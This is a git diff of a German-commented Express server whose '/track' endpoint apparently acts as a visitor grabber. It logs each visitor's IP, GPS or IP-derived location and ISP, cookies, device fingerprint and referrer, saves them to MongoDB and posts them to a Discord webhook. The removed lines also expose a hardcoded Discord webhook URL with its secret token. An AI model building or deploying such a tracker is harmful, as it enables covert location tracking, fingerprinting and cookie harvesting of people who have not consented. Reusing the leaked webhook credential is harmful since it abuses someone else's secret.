@@ -1,98 +1,144 @@
+// server.js
+require('dotenv').config();
 const express = require('express');
+const mongoose = require('mongoose');
 const axios = require('axios');
-const path = require('path');
 
 const app = express();
+const port = process.env.PORT || 3000;
 
-// ⚠️ In Render unter "Environment Variables" setzen:
-const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1430312650134392916/JxtzDiJF8COOnEKlP5n5q2Yg44JDDbaOsy0oWJ_gvxcdHURUQnBU4X4uwvE9aakHyYxE';
+// WICHTIG: hinter Proxy (Render)
+app.set('trust proxy', true);
 
+// ENV
+const { DISCORD_WEBHOOK_URL, MONGODB_URI } = process.env;
+
+// Middleware
 app.use(express.json());
+app.use(express.static('public'));
 
-// Startseite / index.html ausliefern
-app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, 'index.html'));
-});
+// MongoDB (Atlas)
+if (!MONGODB_URI) {
+  console.error('FEHLER: MONGODB_URI nicht gesetzt.');
+}
+mongoose.connect(MONGODB_URI, { })
+  .then(() => console.log('MongoDB verbunden'))
+  .catch(err => console.error('MongoDB-Verbindungsfehler:', err.message));
 
-// 📡 /track – Quelle kennzeichnen (GPS vs. IP) + optional Accuracy anzeigen
+const DataSchema = new mongoose.Schema({ data: Object, timestamp: Date });
+const Data = mongoose.model('Data', DataSchema);
+
+// IP ermitteln (Proxy-freundlich)
+function getClientIp(req) {
+  const xf = req.headers['x-forwarded-for'];
+  if (xf) {
+    const first = Array.isArray(xf) ? xf[0] : String(xf).split(',')[0];
+    return first.trim().replace(/^::ffff:/, '');
+  }
+  return (req.socket?.remoteAddress || '').replace(/^::ffff:/, '');
+}
+
+// Healthcheck (optional für Render)
+app.get('/health', (_, res) => res.send('ok'));
+
+// Tracking
 app.get('/track', async (req, res) => {
-  // IP robust ermitteln (x-forwarded-for kann Komma-Liste sein)
-  const rawIp = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').toString();
-  const ip = rawIp.split(',')[0].trim() || '—';
-  const userAgent = req.headers['user-agent'] || 'unknown';
+  const ip = getClientIp(req);
+  const userAgent = req.headers['user-agent'] || '';
   const timestamp = new Date().toISOString();
 
-  let source = 'ip';       // 'gps' wenn Browser Koordinaten liefert
-  let location = {};
-  let accuracy;            // Meter
+  const {
+    lat, lon, language, languages, cookies, screen, window: win,
+    timezone, platform, hardwareConcurrency, deviceMemory, connection,
+    referrer
+  } = req.query;
 
-  if (req.query.lat && req.query.lon) {
-    source = 'gps';
-    location = {
-      latitude: String(req.query.lat),
-      longitude: String(req.query.lon),
-    };
-    if (req.query.acc) accuracy = String(req.query.acc);
+  // Standort
+  let location = {};
+  if (lat && lon) {
+    location = { latitude: lat, longitude: lon };
   } else {
-    // Optionaler Fallback: IP-Geolocation (nur grob, kann bei ::1/127.0.0.1 nichts liefern)
     try {
-      if (ip && ip !== '::1' && ip !== '127.0.0.1') {
-        const r = await axios.get(`http://ip-api.com/json/${ip}`);
-        if (r?.data?.status === 'success') {
-          location = {
-            city: r.data.city || '—',
-            region: r.data.regionName || '—',
-            country: r.data.country || '—',
-            latitude: r.data.lat ?? '—',
-            longitude: r.data.lon ?? '—',
-          };
-        }
+      // ip-api.com: Client-IP nutzen, nicht die Server-IP
+      const r = await axios.get(`http://ip-api.com/json/${ip}`, { timeout: 4000 });
+      if (r?.data?.status === 'success') {
+        location = {
+          city: r.data.city,
+          region: r.data.regionName || r.data.region,
+          country: r.data.country,
+          latitude: r.data.lat,
+          longitude: r.data.lon,
+          isp: r.data.isp
+        };
       }
     } catch (e) {
-      console.error('🌐 IP-Geolocation-Fehler:', e.message);
+      console.error('IP-Geolocation-Fehler:', e.message);
     }
   }
 
-  // Konsolen-Log zur Kontrolle
-  console.log({ source, ip, userAgent, timestamp, location, query: req.query || {} });
+  const collectedData = {
+    ip,
+    userAgent,
+    timestamp,
+    location,
+    browserData: {
+      language, languages, cookies, screen, window: win, timezone,
+      platform, hardwareConcurrency, deviceMemory, connection, referrer
+    },
+    rawQuery: req.query
+  };
 
-  // Discord-Embed zusammenbauen
-  const fields = [
-    { name: 'Quelle', value: source === 'gps' ? '📍 GPS (genau)' : '🌐 IP-Schätzung (grob)', inline: false },
-    { name: 'IP', value: ip === '::1' ? '::1 (localhost)' : String(ip), inline: false },
-    { name: 'User-Agent', value: userAgent.slice(0, 1000), inline: false },
-    { name: 'Zeit', value: timestamp, inline: false },
-  ];
-  if (source === 'gps') {
-    fields.push({ name: 'Standort (lat/lon)', value: '```json\n' + JSON.stringify(location, null, 2) + '\n```', inline: false });
-    if (accuracy) fields.push({ name: 'Genauigkeit', value: `${accuracy} m`, inline: true });
-  } else if (Object.keys(location).length) {
-    fields.push({ name: 'IP-Standort (grobe Schätzung)', value: '```json\n' + JSON.stringify(location, null, 2) + '\n```', inline: false });
-  }
-
+  // in Mongo speichern (Fehler nicht blockieren)
   try {
-    await axios.post(DISCORD_WEBHOOK_URL, {
-      embeds: [
-        {
-          title: '📡 Neuer Track-Request',
-          color: source === 'gps' ? 0x2ecc71 : 0xf1c40f, // grün = GPS, gelb = IP
-          fields,
-          footer: { text: 'Express Tracker' },
-          timestamp
-        }
-      ]
-    });
-    res.send('OK');
-  } catch (err) {
-    console.error('❌ Fehler beim Senden an Discord:', err.message);
-    res.status(500).send('Failed to send to Discord');
+    await new Data({ data: collectedData, timestamp: new Date() }).save();
+  } catch (e) {
+    console.error('Mongo-Speicherfehler:', e.message);
   }
+
+  // an Discord posten
+  if (DISCORD_WEBHOOK_URL) {
+    try {
+      const content = `📡 **Neuer Track** — ${timestamp}`;
+      const embeds = [{
+        title: 'Tracking-Daten',
+        color: 0x2b90d9,
+        fields: [
+          { name: 'IP', value: String(ip || '–'), inline: true },
+          { name: 'User-Agent', value: userAgent.slice(0, 256) || '–', inline: false },
+          { name: 'Zeitzone', value: String(timezone || '–'), inline: true },
+          { name: 'Referrer', value: String(referrer || '–'), inline: false },
+          { name: 'Language(s)', value: String(language || languages || '–').slice(0, 256), inline: true },
+          { name: 'Platform', value: String(platform || '–'), inline: true },
+          { name: 'HW / RAM', value: `Cores: ${hardwareConcurrency || '–'} | RAM: ${deviceMemory || '–'}`, inline: true },
+          { name: 'Screen', value: String(screen || '–').slice(0, 256), inline: false },
+          { name: 'Window', value: String(win || '–').slice(0, 256), inline: false },
+          { name: 'Netz', value: String(connection || '–').slice(0, 256), inline: false },
+          {
+            name: 'Location',
+            value:
+              (location.latitude && location.longitude)
+                ? `Lat, Lon: ${location.latitude}, ${location.longitude}\n${location.city || ''} ${location.region || ''} ${location.country || ''}${location.isp ? `\nISP: ${location.isp}` : ''}`
+                : (location.city || location.country ? `${location.city || ''} ${location.region || ''} ${location.country || ''}` : '–'),
+            inline: false
+          }
+        ],
+        timestamp
+      }];
+
+      await axios.post(DISCORD_WEBHOOK_URL, { content, embeds }, { timeout: 5000 });
+    } catch (e) {
+      console.error('Discord-Webhook-Fehler:', e.response?.status, e.response?.data || e.message);
+    }
+  } else {
+    console.warn('Kein DISCORD_WEBHOOK_URL gesetzt – überspringe Discord-Post.');
+  }
+
+  res.send('Daten empfangen');
 });
 
-// 🚀 Server starten (Render-kompatibel)
-const port = process.env.PORT || 3000;
-app.listen(port, '0.0.0.0', () => console.log(`✅ Server on ${port}`));
-
+app.listen(port, () => {
+  console.log(`Server läuft auf http://localhost:${port}`);
+});
 
 
 
